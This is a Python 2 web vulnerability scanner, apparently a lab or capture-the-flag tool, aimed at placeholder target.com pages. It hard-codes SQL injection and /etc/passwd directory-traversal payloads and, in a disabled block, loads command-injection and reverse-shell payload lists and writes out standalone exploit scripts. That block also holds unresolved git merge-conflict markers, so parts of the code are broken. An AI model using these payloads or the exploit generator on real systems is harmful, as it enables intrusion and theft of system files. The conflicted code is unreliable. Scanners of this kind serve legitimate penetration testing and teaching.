import requests
from requests import Request, Session
from pprint import pprint
from urlparse import urlparse
import binascii
import copy
import difflib
import os
import json


CONFIG_SQLI_SLEEP_TIME = 3

SQLI_PROBES = [
	"' OR SLEEP(%d);#" % CONFIG_SQLI_SLEEP_TIME,
	"' OR SLEEP(%d);--" % CONFIG_SQLI_SLEEP_TIME,
	"' OR sleep(%d);#" % CONFIG_SQLI_SLEEP_TIME,
	"' OR sleep(%d);--" % CONFIG_SQLI_SLEEP_TIME,
	"' OR 1=1;#",
	"' OR 1=1;--",
	"' or '1'='1",
	"2 order by 1--",
	"2 order by 2--",
	"2 order by 3--",
	"2 order by 4--",
	"2 order by 5--",
	"2 order by 6--",
	"2 order by 7--",
	"union all select @@version --",
	"union all select 1,@@version,1 --",
	"union all select 1,1,@@version,1--",
	"union all select 1,1,,1,@@version,1--",
	"union all select 1,1,,1,1,@@version,1--",
	"union all select 1,1,1,1,1,@@version,1--",
	"union all select 1,1,1,1,,1,@@version,1--",
	"union select 1, tbl_name FROM sqlite_master; -- -",
	"union select 1, 2, tbl_name FROM sqlite_master; -- -",
	"union select 1, 2, 3, tbl_name FROM sqlite_master; -- -",
	"union select 1, 2, 3, 4, tbl_name FROM sqlite_master; -- -",
	"union select 1, 2, 3, 4, 5, tbl_name FROM sqlite_master; -- -"

]

DIR_TRAVERSAL_PROBES = [
	"./" + "../" * 1 + "etc/passwd",
	"./" + "../" * 2 + "etc/passwd",
	"./" + "../" * 3 + "etc/passwd",
	"./" + "../" * 4 + "etc/passwd",
	"./" + "../" * 5 + "etc/passwd",
	"./" + "../" * 6 + "etc/passwd",
	"./" + "../" * 7 + "etc/passwd",
	"./" + "../" * 8 + "etc/passwd",
	"./" + "../" * 9 + "etc/passwd",
	".//" + "..//" * 1 + "etc//passwd",
	".//" + "..//" * 2 + "etc//passwd",
	".//" + "..//" * 3 + "etc//passwd",
	".//" + "..//" * 4 + "etc//passwd",
	".//" + "..//" * 5 + "etc//passwd",
	".//" + "..//" * 6 + "etc//passwd",
	".//" + "..//" * 7 + "etc//passwd",
	".//" + "..//" * 8 + "etc//passwd",
	".//" + "..//" * 9 + "etc//passwd",
]


with open('commandInjPayloads.txt') as f:
 commandExecList = list(f)

with open('serverSidePayloads.txt') as f:
 serverInjectList = list(f)

with open('commandInjExploitPayloads.txt') as f:
 commandExecExploitList = list(f)

with open('commandInjExploitRevShellPayloads.txt') as f:
 commandExecExploitRevShellList = list(f)

with open('serverSideExploitPayloads.txt') as f:
 serverInjectExploitList = list(f)


session = Session()

def scan(url, params):
	print("\n[*] Scanning: %s" % url)
	print("[*] Known Params:")
	pprint(params)

	#Parse endpoints for results file
	parts = urlparse(url)
	hostname = parts.scheme + "://" + parts.netloc
	endpoint = parts.path

	#Results file
	json_results = ""

 	'''
	#Command Injection
	initial_length = ""
	exploitable = "no"
	for method in params.keys():
		method_params = params[method]

	for key, value in method_params.items():
		response = requests.post(url,data=method_params)
		initial_length = response.headers['content-length']
<<<<<<< HEAD
		print "[*]Initial response content length: " + str(response.headers['content-length'])

=======
		print("Initial response content length: " + str(response.headers['content-length']))
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb

	#Scan for potential vulns
	for x in commandExecList:
		for key, value in method_params.items():
			method_params[key] = x.replace("\n", "")

			response = make_request(method, url, method_params)
<<<<<<< HEAD
			print "\n[*]Payload used: " + str(method_params)
			print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
			print "[*]Response content length: " + str(response.headers['content-length'])
			print "[*]Response content: \n" + response.content

			delta = int(response.headers['content-length']) - int(initial_length)

			#Search for specific echo string 'gaw4f4sdaf12f', output of passwd or id command.
			if response.content.find("gaw4f4sdaf12f") != -1 or response.content.find("/bin") != -1 or response.content.find("uid=") != -1:
				print "[*]Module is potentially vulnerable to command injection!"
=======
			print("\nPayload used: " + str(method_params))
			print("Elapsed Time: " + str(response.elapsed.total_seconds()))
			print("Response content: " + response.content)
			print("Response content length: " + str(response.headers['content-length']))

			delta = int(response.headers['content-length']) - int(initial_length)

			if response.content.find("gaw4f4sdaf12f") != -1 or response.content.find("/bin") != -1 or response.content.find("uid=") != -1 or delta > 50:
				print("Module is potentially vulnerable to command injection!")
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb
				exploitable = "yes"
				with open('results.txt', 'a') as result:
					result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')

<<<<<<< HEAD
			#sleep command is 10 seconds
			elif response.elapsed.total_seconds() > 8:
				print "[*]Module is potentially vulnerable to blind command injection!"
=======
			elif response.elapsed.total_seconds() > 25:
				print("Module is potentially vulnerable to blind command injection!")
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb
				exploitable = "yes"
				with open('results.txt', 'a') as result:
					result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')


			#Generate exploitation scripts
			if exploitable == "yes":
				count = 0
				for y in commandExecExploitList:
					for key, value in method_params.items():
						method_params[key] = y.replace("\n", "")
						response = make_request(method, url, method_params)
<<<<<<< HEAD
						print "\n[*]Searching for the correct exploit..."
						print "[*]Payload used: " + str(method_params)
						print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
						print "[*]Response content length: " + str(response.headers['content-length'])
						print "[*]Response content: \n" + response.content

						count=+count+1
						if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
							print "[*]Exploit found!"

							#Generate standalone exploit script
						 	with open('command_injection'+str(count)+'.py', 'w') as exploitFile:
			 					if method == "POST":
			 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
			 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
			 						exploitFile.write("print response.content")

			 					elif method == "GET":
			 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
			 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
			 						exploitFile.write("print response.content")
=======
						print("\nPayload used: " + str(method_params))
						print("Elapsed Time: " + str(response.elapsed.total_seconds()))
						print("Response content: " + response.content)
						print("Response content length: " + str(response.headers['content-length']))
						print("Searching for the correct exploit...")

						count=+count+1
						if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment. Some reverse shell payload will hang the server, need to find a solution for this
							print("Exploit found!")
							with open('command_injection'+str(count)+'.py', 'w') as exploitFile:
								if method == "POST":
									exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
									exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
									exploitFile.write("print response.content")
								elif method == "GET":
									exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
									exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
									exploitFile.write("print response.content")
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb

						 	exploitable = "no" # reset to orignal state

				for z in commandExecExploitRevShellList:
					for key, value in method_params.items():
						method_params[key] = z.replace("\n", "")
						count=+count+1

						#Generate standalone exploit script
					 	with open('command_injection_rev_shell'+str(count)+'.py', 'w') as exploitFile:
		 					if method == "POST":
		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
		 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
		 						exploitFile.write("print response.content")

		 					elif method == "GET":
		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
		 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
		 						exploitFile.write("print response.content")

					 	exploitable = "no" # reset to orignal state



	#Server Side Injection
	initial_length = ""
	exploitable = "no"
	for method in params.keys():
		method_params = params[method]

	for key, value in method_params.items():
		response = requests.post(url,data=method_params)
		initial_length = response.headers['content-length']
<<<<<<< HEAD
		print "[*]Initial response content length: " + str(response.headers['content-length'])
=======
		print("Initial response content length: " + str(response.headers['content-length']))
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb

	#Scan for potential vulns
	for x in serverInjectList:
		for key, value in method_params.items():
			method_params[key] = x.replace("\n", "")

		response = make_request(method, url, method_params)
<<<<<<< HEAD
	 	print "\n[*]Payload used: " + str(method_params)
	 	print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
	 	print "[*]Response content length: " + str(response.headers['content-length'])
		print "[*]Response content: \n" + response.content

		delta = int(response.headers['content-length']) - int(initial_length)

		#Searches for specific echo string, or output of passwd
		if response.content.find("vq3rio13dj8x") != -1 or response.content.find("/bin") != -1:
			print "[*]Module potentially vulnerable to sever side injection!"
=======
		print("\nPayload used: " + str(method_params))
		print("Elapsed Time: " + str(response.elapsed.total_seconds()))
		print("Response content: " + response.content)
		print("Response content length: " + str(response.headers['content-length']))

		delta = int(response.headers['content-length']) - int(initial_length)

		if response.content.find("vq3rio13dj8x") != -1 or response.content.find("/bin") != -1 or delta > 50:
			print("Module potentially vulnerable to sever side injection!")
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb
			exploitable = "yes"
			with open('results.txt', 'a') as result:
				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
			#break

		elif response.elapsed.total_seconds() > 12:
<<<<<<< HEAD
			print "[*]Vulnerable to blind sever side injection"
=======
			print("Vulnerable to blind sever side injection")
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb
			exploitable = "yes"
			with open('results.txt', 'a') as result:
				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
			#break

		#Generate exploitable scripts
		if exploitable == "yes":
			count = 0
			for y in serverInjectExploitList:
				for key, value in method_params.items():
					method_params[key] = y.replace("\n", "")
					response = make_request(method, url, method_params)

<<<<<<< HEAD
					print "\n[*]Searching for the correct exploit..."
					print "[*]Payload used: " + str(method_params)
					print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
					print "[*]Response content length: " + str(response.headers['content-length'])
					print "[*]Response content: \n" + response.content


					count=+count+1
					if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment.
						print "[*]Exploit found!"
=======
					print("\nPayload used: " + str(method_params))
					print("Elapsed Time: " + str(response.elapsed.total_seconds()))
					print("Response content: " + response.content)
					print("Response content length: " + str(response.headers['content-length']))
					print("Searching for the correct exploit...")

					count=+count+1
					if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment. Some reverse shell payload will hang the server, need to find a solution for this
						print("Exploit found!")
>>>>>>> 0f53ee292bb723a749629454d366eaaf6b0f1bcb
						with open('server_injection'+str(count)+'.py', 'w') as exploitFile:
							if method == "POST":
								exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
								exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
								exploitFile.write("print response.content")
							elif method == "GET":
								exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
								exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
								exploitFile.write("print response.content")

						exploitable = "no" # reset to orignal state


'''

	# Check for open redirects
	# ========================
	# 1. Parameter value is contained in redirected URL
	print("[*] Testing for open redirects")
	for method in params.keys():
		method_params = params[method]
		response = make_request(method, url, method_params)
		for history_response in response.history:
			if 300 <= history_response.status_code < 400:
				print("[!] Request history contains redirect: %s (%d)" % (history_response.url, history_response.status_code))
		for param, value in method_params.items():
			parsed_url = urlparse(response.url)
			if parsed_url.path.endswith(str(value)):
				print("[!] Redirected URL path ends with parameter value (%s=%s)" % (param, value))

	# Check for unsanitized inputs
	# ============================
	# 1. Using a few random values and checking if response changes
	#    We are looking for whether first delta changes (i.e. original input is a valid input)
	print("[*] Testing for unsanitized inputs")
	for method in params.keys():
		method_params = params[method]
		response = make_request(method, url, method_params)
		prev_html = response.content
		first_delta = False
		for i in range(3):
			params_copy = copy.deepcopy(method_params)
			for key in params_copy.keys():
				params_copy[key] = binascii.hexlify(os.urandom(20))
			request = Request(method, url, params=params_copy)
			prepared_request = session.prepare_request(request)
			response = session.send(prepared_request)
			delta = difflib.context_diff(prev_html, response.content)
			print("[*] Listing page HTML delta")
			count = 0
			for line in delta:
				# print(line)
				count += 1
			if i == 0 and count > 0:
				first_delta = True
			print("[*] Delta lines: %d" % count)
			prev_html = response.content

		if first_delta:
			print("[*] Non-zero first delta, trying directory traversal probes")
			for param in method_params.keys():
				params_copy = copy.deepcopy(method_params)
				for probe in DIR_TRAVERSAL_PROBES:
					params_copy[param] = probe
					response = make_request(method, url, params_copy)
					if "root:x:0:0" in response.content:
						print("[!] Found directory traversal indication using parameter value (%s=%s)" % (param, probe))
						break

		print("[*] Trying SQLi probes")
		for param in method_params.keys():
			params_copy = copy.deepcopy(method_params)
			for probe in SQLI_PROBES:
				params_copy[param] = probe
				response = make_request(method, url, params_copy)
				print response.content
				delta_lines = sum(1 for _ in difflib.context_diff(prev_html, response.content))
				if "SLEEP" in probe or "sleep" in probe:
					if response.elapsed.total_seconds() > CONFIG_SQLI_SLEEP_TIME:
						print("[!] Highly possible SQLi, probe triggered server sleep using parameter value (%s=%s)" % (param, probe))
						break
				if delta_lines > 5:
					print("[!] Possible SQLi, probe triggered large response delta using parameter value (%s=%s)" % (param, probe))
					break

def make_request(method, url, params):
	if method == 'POST':
		return session.post(url, data=params)
	elif method == 'GET':
		return session.get(url, params=params)

	else:
		raise ValueError("Unknown method %s" % method)

if __name__ == '__main__':
	#scan('http://target.com/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
	scan('http://target.com/sqli/sqli.php', {'POST': {'username': None}})
	#scan('http://target.com/directorytraversal/directorytraversal.php', {'GET': {'ascii': 'angry.ascii'}})
	#scan('http://target.com/commandinjection/commandinjection.php', {'POST': {'host': '8.8.8.8'}})
	#scan('http://target.com/serverside/serverside.php', {'GET': {'language': 'apples'}})
